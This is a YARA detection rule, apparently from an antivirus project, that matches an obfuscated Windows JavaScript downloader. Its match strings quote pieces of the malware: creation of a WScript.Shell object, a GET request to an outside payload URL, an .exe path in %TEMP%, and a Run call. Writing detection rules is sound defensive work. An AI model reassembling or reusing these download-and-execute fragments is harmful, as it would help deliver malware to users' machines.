rule sig_20160328_cfe8baf493ac168d428ae931cee280f2 {
  meta:
    description = "datamaliciousorder - file 20160328_cfe8baf493ac168d428ae931cee280f2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5ea4339a7432d48d22e5681242ff704eb00024dbef8197f460b65d79f80857f1"

  strings:
    $s1  = "function Czyxyvhyd() {return Rcaqdry[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Mwx98WNjOx9.exe\";};" fullword ascii
    $s2  = "do {WScript[Fqmxpvw](Krjscwa() * 11)} while (Ghtckeymi[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Ghtckeymi[Ojhffwmasl](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s4  = "function Ykznpcvd(Loinep, Roocyw){return Loinep - Roocyw;};" fullword ascii
    $s5  = "var Rcaqdry = function Ktcoo() {return WScript[Zrjcshwa](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Qhbfrlijut() {return ((Jaqochlgj == true) && (Jaqochlgj == Moqfqywisj)) ? 1 : Afjihb;};" fullword ascii
    $s7  = "function Krjscwa(){return 22;};" fullword ascii
    $s8  = "return Ykznpcvd(Qkvjbw, Csasx);" fullword ascii
    $s9  = " while (Dfpgqnh){" fullword ascii
    $s10 = "var Harlbh = false;" fullword ascii
    $s11 = "var Moqfqywisj = false;" fullword ascii
    $s12 = "function Ryrdn()" fullword ascii
    $s13 = "function Rcdyyvj(){return Zrjcshwa;};" fullword ascii
    $s14 = "function Nlasp(){return Wchpdyi;};" fullword ascii
    $s15 = "function Wvckyt(Jnqgcgz) {var Ikdipgvis = (1, 2, 3, 4, 5, Jnqgcgz); return Ikdipgvis;};" fullword ascii
    $s16 = "var Poobm = new this[\"Date\"]();" fullword ascii
    $s17 = "Moqfqywisj = true; " fullword ascii
    $s18 = "Jaqochlgj = true; " fullword ascii
    $s19 = "var Jaqochlgj = false;" fullword ascii
    $s20 = "function Lqmydmksaf(Zspgqh){Rcaqdry[\"Run\"](Zspgqh, Afjihb, Afjihb);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}